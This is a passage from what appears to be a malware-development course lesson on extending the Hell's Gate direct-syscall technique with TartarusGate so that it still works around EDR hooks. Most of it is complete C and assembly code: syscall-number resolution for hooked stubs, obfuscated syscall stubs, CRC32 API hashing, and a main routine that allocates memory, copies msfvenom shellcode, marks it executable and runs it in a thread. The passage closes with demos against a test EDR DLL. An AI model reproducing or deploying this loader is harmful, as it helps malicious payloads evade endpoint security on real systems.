id="2441c3fd-7fd7-49b2-94bb-9b52f2309768" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-218996854-1d20335d-ebc6-4c6c-b2a2-e8f584ac85b3.png"><img style="width:1242px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-218996854-1d20335d-ebc6-4c6c-b2a2-e8f584ac85b3.png"/></a></figure><p id="a0dfb589-2054-43ba-8a8b-14772f3e3411" class="">Assume syscall B is being called using the Hell&#x27;s Gate implementation, it will search for the <code>0x4c, 0x8b, 0xd1, 0xb8</code> opcodes which represent the <code>mov r10, rcx</code> and <code>mov rcx, ssn</code> instructions. But as shown in the image above, there are no such opcodes, meaning Hell&#x27;s Gate&#x27;s implementation would fail in obtaining the SSN of syscall B.</p><p id="a1ecf82d-9acb-4c45-8426-09fcf1363d6f" class="">TartarusGate uses neighboring syscalls to calculate the SSN of the specified syscall. If TartarusGate searches upwards then the SSN of syscall B is the <code>SSN of syscall A - 1</code>. On the other hand, if TartarusGate searches downwards then the SSN of syscall B is the <code>SSN of syscall C + 1</code>.</p><h3 id="8af6fb2b-f70e-400b-aecd-7588c097dd3e" class=""><strong>TartarusGate Example</strong></h3><p id="366acfea-86f1-42cf-b93b-f095409eced9" class="">When <code>NtProtectVirtualMemory</code> is unhooked, its SSN is <code>0x50</code>.</p><figure id="d17bfabb-ff6d-45ff-a973-df03a36dcb38" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-318996340-a18adfb0-0cbe-4ac2-a5cd-b504f8f60525.png"><img style="width:1138px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-318996340-a18adfb0-0cbe-4ac2-a5cd-b504f8f60525.png"/></a></figure><p id="31af6ad9-f553-46f7-96e4-e5c9afef490e" class="">The image below uses <code>ZwIsProcessInJob</code> as syscall A, <code>NtProtectVirtualMemory</code> as syscall B, and <code>NtQuerySection</code> as syscall C. <code>NtProtectVirtualMemory</code> is hooked, but its SSN can still be calculated using the adjacent syscalls (A &amp; C).</p><figure id="80c4cf0c-7a22-4ce8-bf42-fda1ca3a5100" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-418994573-eaf74f3a-647c-44a2-9ce2-ac97916a9b12.png"><img style="width:1721px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-418994573-eaf74f3a-647c-44a2-9ce2-ac97916a9b12.png"/></a></figure><p id="2a4515a6-91a7-4b06-9fec-d75c5455f06e" class="">sing the previously explained logic where upward search uses <code>SSN of syscall A - 1</code> and downward search uses <code>SSN of syscall C + 1</code>, they both successfully result in <code>NtProtectVirtualMemory</code>&#x27;s correct SSN, <code>0x50</code>.</p><figure id="dbd2cfa8-b86d-4b14-8e70-77e9fb1dd362" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-518995420-b4dc7adb-c5f2-4a38-99a1-cfb1e845f300.png"><img style="width:1014px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-518995420-b4dc7adb-c5f2-4a38-99a1-cfb1e845f300.png"/></a></figure><p id="8b653bd4-469a-41ef-9403-894afe62f4ce" class="">Note that the search path can extend beyond the direct neighboring syscalls. For example, if one is calling syscall C, which is hooked, then syscall C&#x27;s SSN is equal to the following:</p><ul id="da4aa362-52fe-4259-b500-23fe0c187e6c" class="bulleted-list"><li style="list-style-type:disc">Syscall A&#x27;s SSN plus two</li></ul><ul id="a0179c41-0516-4676-ad4a-cf170bd8dc89" class="bulleted-list"><li style="list-style-type:disc">Syscall B&#x27;s SSN plus one</li></ul><ul id="4701b942-6990-416b-8545-76b220ad8212" class="bulleted-list"><li style="list-style-type:disc">Syscall D&#x27;s SSN minus one</li></ul><ul id="b85d3738-ec7d-4615-8074-87c0a62c9f4c" class="bulleted-list"><li style="list-style-type:disc">Syscall E&#x27;s SSN minus two</li></ul><ul id="79dfb9a7-e2b6-4bc3-a415-f6a172db7733" class="bulleted-list"><li style="list-style-type:disc">Syscall F&#x27;s SSN minus three</li></ul><p id="832a4f23-7ce8-4931-9c81-3397446ee737" class="">The image below illustrates this more clearly, where <code>idx</code> is the number to add or subtract.</p><figure id="c034a7a4-a295-4cdf-9ee4-685024900594" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-619273167-9a251b35-1cb2-477a-80ba-b5ac9c0093a5.png"><img style="width:1212px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-619273167-9a251b35-1cb2-477a-80ba-b5ac9c0093a5.png"/></a></figure><h3 id="fa5a8660-9a32-4222-95ac-2a8b4bdcc375" class=""><strong>Updating FetchNtSyscall</strong></h3><p id="f0ebeb7f-ceb1-4cb6-9e1a-98f827f11fd4" class="">After understanding how TartarusGate works, the <code>FetchNtSyscall</code> function is updated to use that search logic. Some aspects of the updated <code>FetchNtSyscall</code> function:</p><ul id="788cef8f-8e8e-4bbf-9a02-f5ed77e9307d" class="bulleted-list"><li style="list-style-type:disc"><code>RANGE</code> is 255, representing the maximum number of syscalls to go up or down in the memory.</li></ul><ul id="d14efaff-8938-4bdd-9038-252fd5deec19" class="bulleted-list"><li style="list-style-type:disc"><code>UP</code> is equal to 32, which is the size of a syscall. This is used when searching upwards.</li></ul><ul id="62d6e28d-d618-49cb-acd4-0cfaa85ebb7d" class="bulleted-list"><li style="list-style-type:disc"><code>DOWN</code> is equal to -32, which is the negative size of a syscall. This is used when searching downward.</li></ul><ul id="50221bd8-3484-4f45-854a-058e03b5586d" class="bulleted-list"><li style="list-style-type:disc">When the search path is upwards, the specified syscall&#x27;s SSN is <code>(high &lt;&lt; 8) | low + idx</code>, where <code>idx</code> is the number of syscalls above the current syscall (<code>pFuncAddress</code>&#x27;s address).</li></ul><ul id="6967e995-075b-4803-bbec-16bcdd84239b" class="bulleted-list"><li style="list-style-type:disc">When the search path is downward, the specified syscall&#x27;s SSN is <code>(high &lt;&lt; 8) | low - idx</code>, where <code>idx</code> is the number of syscalls below the current syscall (<code>pFuncAddress</code> address).</li></ul><pre id="0d94f8df-0de7-4bd2-8ff2-56370ce7811f" class="code code-wrap"><code>BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // initialize ntdll config if not found
    if (!g_NtdllConf.uModule) {
        if (!InitNtdllConfigStructure())
            return FALSE;
    }

    if (dwSysHash != NULL)
        pNtSys-&gt;dwSyscallHash = dwSysHash;
    else
        return FALSE;

    for (size_t i = 0; i &lt; g_NtdllConf.dwNumberOfNames; i++){

        PCHAR pcFuncName    = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress  = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);

        pNtSys-&gt;pSyscallAddress = pFuncAddress;

        // if syscall found
        if (HASH(pcFuncName) == dwSysHash) {

            if (*((PBYTE)pFuncAddress) == 0x4C
                &amp;&amp; *((PBYTE)pFuncAddress + 1) == 0x8B
                &amp;&amp; *((PBYTE)pFuncAddress + 2) == 0xD1
                &amp;&amp; *((PBYTE)pFuncAddress + 3) == 0xB8
                &amp;&amp; *((PBYTE)pFuncAddress + 6) == 0x00
                &amp;&amp; *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE high = *((PBYTE)pFuncAddress + 5);
                BYTE low  = *((PBYTE)pFuncAddress + 4);
                pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low;
                break; // break for-loop [i]
            }

            // if hooked - scenario 1
            if (*((PBYTE)pFuncAddress) == 0xE9) {

                for (WORD idx = 1; idx &lt;= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            // if hooked - scenario 2
            if (*((PBYTE)pFuncAddress + 3) == 0xE9) {

                for (WORD idx = 1; idx &lt;= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            break; // break for-loop [i]

        }

    }


    if (pNtSys-&gt;dwSSn != NULL &amp;&amp; pNtSys-&gt;pSyscallAddress != NULL &amp;&amp; pNtSys-&gt;dwSyscallHash != NULL)
        return TRUE;
    else
        return FALSE;
}
</code></pre><h3 id="772bfcd2-343d-402c-ab5d-06a9b7761cfb" class=""><strong>Updating Assembly Functions</strong></h3><p id="95a2f25d-a4ee-4596-8c35-27cc2490fbf7" class="">The functions <code>HellsGate</code> and <code>HellDescent</code>, found in <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/hellsgate.asm">hellsgate.asm</a> will be replaced with <code>SetSSn</code> and <code>RunSyscall</code> respectively. <code>SetSSn</code> requires the SSN of the syscall to be called and <code>RunSyscall</code> will execute it.</p><p id="df5c00cd-fd4b-48ed-9fde-cc2cdf763669" class="">There aren&#x27;t any major updates to these two functions, however, additional assembly instructions were added which do not affect the program&#x27;s execution but will add obfuscation.</p><h3 id="fb5fd662-0499-4848-89d3-b2527f000217" class=""><strong>Unobfuscated Assembly Functions</strong></h3><p id="30b6dc45-eb27-48cf-b600-df5379043296" class=""><code>SetSSN</code> &amp; <code>RunSyscall</code> without unnecessary assembly instructions.</p><pre id="d52c7d7f-804d-45d5-9453-bf704ec3099c" class="code code-wrap"><code>.data
	wSystemCall DWORD 0000h

.code

	SetSSn PROC
		mov wSystemCall, 000h
		mov wSystemCall, ecx
		ret
	SetSSn ENDP

	RunSyscall PROC
		mov r10, rcx
		mov eax, wSystemCall
		syscall
		ret
	RunSyscall ENDP

end
</code></pre><h3 id="8ddb2209-cd79-4bd2-82f9-9eae8dbaea1e" class=""><strong>Obfuscated Assembly Functions</strong></h3><p id="d70d2732-ee61-4336-b22b-93ec2a12dd2f" class=""><code>SetSSN</code> &amp; <code>RunSyscall</code> with added assembly instructions.</p><pre id="b233ad8c-aa40-4fea-ae89-d881dd1785bc" class="code code-wrap"><code>.data
	wSystemCall DWORD 0000h

.code

	SetSSn PROC
			xor eax, eax			; eax = 0
			mov wSystemCall, eax		; wSystemCall = 0
			mov eax, ecx			; eax = ssn
			mov r8d, eax			; r8d = eax = ssn
			mov wSystemCall, r8d		; wSystemCall = r8d = eax = ssn
			ret
	SetSSn ENDP

	RunSyscall PROC
			xor r10, r10			; r10 = 0
			mov rax, rcx			; rax = rcx
			mov r10, rax			; r10 = rax = rcx
			mov eax, wSystemCall		; eax = ssn
			jmp Run                  ; execute &#x27;Run&#x27;
			xor eax, eax     ; wont run
			xor rcx, rcx     ; wont run
			shl r10, 2       ; wont run
		Run:
			syscall
			ret
	RunSyscall ENDP

end
</code></pre><h3 id="5148fab2-23ac-4096-9fef-c16804e55372" class=""><strong>Updating The Main Function</strong></h3><h3 id="0b4e6ea0-a5a8-4f59-93c4-56fb714772c8" class=""><strong>Creating The NTAPI_FUNC Structure</strong></h3><p id="de365f5b-c5db-4f25-8d85-2b56e3158d39" class="">The updated Hell&#x27;s Gate implementation is now completed. The last part is to test the implementation which requires the main function. To do so, a new structure is created that replaces the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L14">VX_TABLE</a>. The new structure, <code>NTAPI_FUNC</code>, will contain the syscalls&#x27; information. Storing this information in a structure will enable calling the syscalls multiple times when initialized as a global variable.</p><p id="57e23907-93ab-4335-b847-3f4f503c11b9" class="">The <code>NTAPI_FUNC</code> structure is shown below.</p><pre id="2ff608ad-f7b3-440e-b902-67a159d4b4c1" class="code code-wrap"><code>typedef struct _NTAPI_FUNC
{
	NT_SYSCALL	NtAllocateVirtualMemory;
	NT_SYSCALL	NtProtectVirtualMemory;
	NT_SYSCALL	NtCreateThreadEx;
	NT_SYSCALL	NtWaitForSingleObject;

}NTAPI_FUNC, *PNTAPI_FUNC;

// global variable
NTAPI_FUNC g_Nt = { 0 };
</code></pre><h3 id="34e8436b-2003-4c9c-b9a0-4fbe6b88cc62" class=""><strong>Creating InitializeNtSyscalls</strong></h3><p id="59b9c98c-8824-477e-97b0-cb2f5c814016" class="">To populate the <code>g_Nt</code> global variable, the newly created function, <code>InitializeNtSyscalls</code>, will call <code>FetchNtSyscall</code> to initialize all members of <code>NTAPI_FUNC</code>.</p><pre id="c78d5b32-4e7a-4ab8-b067-3263736635e7" class="code code-wrap"><code>BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &amp;g_Nt.NtAllocateVirtualMemory)) {
		printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n&quot;);
		return FALSE;
	}
	printf(&quot;[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n&quot;, g_Nt.NtAllocateVirtualMemory.dwSSn);


	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &amp;g_Nt.NtProtectVirtualMemory)) {
		printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n&quot;);
		return FALSE;
	}
	printf(&quot;[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n&quot;, g_Nt.NtProtectVirtualMemory.dwSSn);


	if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &amp;g_Nt.NtCreateThreadEx)) {
		printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n&quot;);
		return FALSE;
	}
	printf(&quot;[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n&quot;, g_Nt.NtCreateThreadEx.dwSSn);


	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &amp;g_Nt.NtWaitForSingleObject)) {
		printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n&quot;);
		return FALSE;
	}
	printf(&quot;[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n&quot;, g_Nt.NtWaitForSingleObject.dwSSn);

	return TRUE;
}
</code></pre><p id="54030cb5-4ffc-463d-a3b8-13830de27964" class=""><code>NtAllocateVirtualMemory_CRC32</code>, <code>NtProtectVirtualMemory_CRC32</code>, <code>NtCreateThreadEx_CRC32</code>, and <code>NtWaitForSingleObject_CRC32</code> are the hash values of the respective syscalls.</p><h3 id="6c232679-4480-425c-ab8c-8f2b4dd2b31e" class=""><strong>Hasher Program</strong></h3><p id="fb9eb4c3-7446-4e02-b4f2-bfc02b12b639" class="">The syscall hashes are generated using the <em>Hasher</em> program which contains the <code>crc32h</code> hashing function. Hasher prints the values of its <code>crc32h</code>&#x27;s function output.</p><pre id="c301554b-89c3-4207-ae24-89a10119a00d" class="code code-wrap"><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#define SEED 0xEDB88320#define STR &quot;_CRC32&quot;unsigned int crc32h(char* message) {
    int i, crc;
    unsigned int byte, c;
    const unsigned int g0 = SEED, g1 = g0 &gt;&gt; 1,
        g2 = g0 &gt;&gt; 2, g3 = g0 &gt;&gt; 3, g4 = g0 &gt;&gt; 4, g5 = g0 &gt;&gt; 5,
        g6 = (g0 &gt;&gt; 6) ^ g0, g7 = ((g0 &gt;&gt; 6) ^ g0) &gt;&gt; 1;

    i = 0;
    crc = 0xFFFFFFFF;
    while ((byte = message[i]) != 0) {    // Get next byte.
        crc = crc ^ byte;
        c = ((crc &lt;&lt; 31 &gt;&gt; 31) &amp; g7) ^ ((crc &lt;&lt; 30 &gt;&gt; 31) &amp; g6) ^
            ((crc &lt;&lt; 29 &gt;&gt; 31) &amp; g5) ^ ((crc &lt;&lt; 28 &gt;&gt; 31) &amp; g4) ^
            ((crc &lt;&lt; 27 &gt;&gt; 31) &amp; g3) ^ ((crc &lt;&lt; 26 &gt;&gt; 31) &amp; g2) ^
            ((crc &lt;&lt; 25 &gt;&gt; 31) &amp; g1) ^ ((crc &lt;&lt; 24 &gt;&gt; 31) &amp; g0);
        crc = ((unsigned)crc &gt;&gt; 8) ^ c;
        i = i + 1;
    }
    return ~crc;
}

#define HASH(API) crc32h((char*)API)int main() {

    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtAllocateVirtualMemory&quot;, STR, HASH(&quot;NtAllocateVirtualMemory&quot;));
    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtProtectVirtualMemory&quot;, STR, HASH(&quot;NtProtectVirtualMemory&quot;));
    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtCreateThreadEx&quot;, STR, HASH(&quot;NtCreateThreadEx&quot;));
    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtWaitForSingleObject&quot;, STR, HASH(&quot;NtWaitForSingleObject&quot;));
}
</code></pre><figure id="61f6ebff-413d-4c75-ac56-d62bf0c2ca54" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-719008069-88be2bdc-b34e-4a9b-a338-91df90cd51a2.png"><img style="width:1256px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-719008069-88be2bdc-b34e-4a9b-a338-91df90cd51a2.png"/></a></figure><h3 id="3c0e2a74-bc9b-4c14-b68d-6ec01b0577a3" class=""><strong>Main Function</strong></h3><p id="6bbb8837-3932-4f93-b246-0b6f4deea7bc" class="">The <code>InitializeNtSyscalls</code> function is called first, followed by syscalls to perform a local code injection using Msfvenom&#x27;s shellcode. The call to the syscalls is done using the <code>SetSSn</code> and <code>RunSyscall</code> assembly functions previously described.</p><pre id="2d9fd419-17a9-4be6-92b1-0e3fa6f18a57" class="code code-wrap"><code>int main() {

	NTSTATUS	STATUS		= NULL;
	PVOID		pAddress	= NULL;
	SIZE_T		sSize		= sizeof(Payload);
	DWORD		dwOld		= NULL;
	HANDLE		hProcess	= (HANDLE)-1,	// local process
			    hThread		= NULL;


	// initializing the used syscalls
	if (!InitializeNtSyscalls()) {
		printf(&quot;[!] Failed To Initialize The Specified Direct-Syscalls \n&quot;);
		return -1;
	}


	// allocating memory
	SetSSn(g_Nt.NtAllocateVirtualMemory.dwSSn);
	if ((STATUS = RunSyscall(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
		printf(&quot;[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n&quot;, STATUS);
		return -1;
	}

	// copying the payload
	memcpy(pAddress, Payload, sizeof(Payload));
	sSize = sizeof(Payload);

	// changing memory protection
	SetSSn(g_Nt.NtProtectVirtualMemory.dwSSn);
	if ((STATUS = RunSyscall(hProcess, &amp;pAddress, &amp;sSize, PAGE_EXECUTE_READ, &amp;dwOld)) != 0x00) {
		printf(&quot;[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X \n&quot;, STATUS);
		return -1;
	}


	// executing the payload
	SetSSn(g_Nt.NtCreateThreadEx.dwSSn);
	if ((STATUS = RunSyscall(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
		printf(&quot;[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n&quot;, STATUS);
		return -1;
	}


	// waiting for the payload
	SetSSn(g_Nt.NtWaitForSingleObject.dwSSn);
	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
		printf(&quot;[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n&quot;, STATUS);
		return -1;
	}


	printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
	getchar();

	return 0;
}

</code></pre><h3 id="a0d9bb99-8c58-499b-a041-6e6041742f51" class=""><strong>Demo 1 - Without TartarusGate</strong></h3><p id="0bf1fbac-ad42-4be1-8ca9-b9020e3bd248" class=""><code>MalDevEdr.dll</code> is injected into the Hell&#x27;s Gate implementation that does not use TartarusGate to find an SSN. This will fail when searching for the SSN, as expected.</p><ul id="64bf3700-7894-40a9-bd66-1dc5ffbc12bf" class="bulleted-list"><li style="list-style-type:disc">Injecting <code>MalDevEdr.dll</code> into the Hell&#x27;s Gate implementation.<figure id="f17982a9-78f1-4a92-93a0-76da460b84d8" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-819042962-afbc121a-d298-419a-b1e5-89eef05d8fa9.png"><img style="width:1676px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-819042962-afbc121a-d298-419a-b1e5-89eef05d8fa9.png"/></a></figure><p id="774dcba9-1c17-4ebb-867a-ba29a203d4a9" class="">• <code>NtProtectVirtualMemory</code> is hooked.</p><figure id="7e0bf3f1-ff53-4827-a5a9-803051362f5c" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-919042983-21be24a2-1648-4a06-afe5-d08ededb7b0e.png"><img style="width:1401px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-919042983-21be24a2-1648-4a06-afe5-d08ededb7b0e.png"/></a></figure><p id="32f1d023-672e-409f-82bb-b86d524e90ac" class="">• Hell&#x27;s Gate fails.</p><figure id="115ee2c5-daa8-4073-9dad-349f27208e39" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-10.png"><img style="width:1863px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-10.png"/></a></figure><h3 id="d31cd23e-144e-421a-b285-2dc2b64a1191" class=""><strong>Demo 2 - With TartarusGate</strong></h3><p id="26d0b692-0653-46e4-9027-cd2c343460bb" class=""><code>MalDevEdr.dll</code> is injected into the Hell&#x27;s Gate implementation that uses TartarusGate to find an SSN. This implementation is able to successfully retrieve the SSN.</p><ul id="9d2ea059-9b6f-41cc-be93-0b3afded8d76" class="bulleted-list"><li style="list-style-type:circle">Injecting <code>MalDevEdr.dll</code> into the Hell&#x27;s Gate implementation that utilizes TartarusGate. Furthermore, breakpoints are inserted in several points in the code for further analysis.</li></ul><p id="e634d97a-f253-47bc-ab7e-c86fa36f3a3f" class="">
</p><figure id="4f8eaa9b-30b6-488c-b3c9-b7808eba7126" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-11.png"><img style="width:1734px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-11.png"/></a></figure><p id="76634315-794c-4e35-b61e-0b2647447edf" class="">• Hitting a breaking point when retrieving the SSN of <code>NtProtectVirtualMemory</code>. Since it&#x27;s hooked, the syscall&#x27;s opcodes aren&#x27;t the same as the usual syscall format.</p><figure id="469487a0-6755-4db9-b001-0fe69bdc55a8" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-12.png"><img style="width:1715px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-12.png"/></a></figure><p id="e171bdab-1106-44fe-9d89-3c13c3a44fd7" class="">• The syscall directly below <code>NtProtectVirtualMemory</code> is unhooked and so its SSN is retrieved instead. The variable <code>idx</code> has a value of 1.</p><figure id="7a5d68dc-da75-4766-8e5a-2f18218b3177" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-13.png"><img style="width:1546px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-13.png"/></a></figure><p id="24ea561a-8de5-4743-a0c5-0db191586984" class="">• <code>low</code> is 81 (in decimal) and <code>high</code> is 0. Calculating this neighboring syscall&#x27;s SSN returns <code>0x51</code> (in hex) or 81 (in decimal)</p><p id="d7af2a05-f100-4a8e-8cbd-107c26f1e33c" class="">
</p><figure id="9a33f35b-0df5-4850-9149-740046691561" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-14.png"><img style="width:1549px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-14.png"/></a></figure><figure id="4b67d36a-b742-4231-9047-44bcb2e0bb18" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-15.png"><img style="width:1132px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-15.png"/></a></figure><p id="80f036fd-f401-4534-99c3-d1cc9f65b690" class="">• Since the search path was downward, <code>NtProtectVirtualMemory</code>&#x27;s SSN is <code>81 - 1 = 80</code>.</p><figure id="141be382-0267-47f5-b187-8c15f2065f80" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-16.png"><img style="width:1162px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-16.png"/></a></figure><p id="0e35f8b2-fc38-4b15-be61-203d871d6547" class="">• 80 in hex is <code>0x50</code>, which is the correct SSN for <code>NtProtectVirtualMemory</code>.</p><figure id="228641e2-1b4d-4029-baee-67d621350272" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-17.png"><img style="width:1582px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-17.png"/></a></figure></li></ul></div></article></body></html>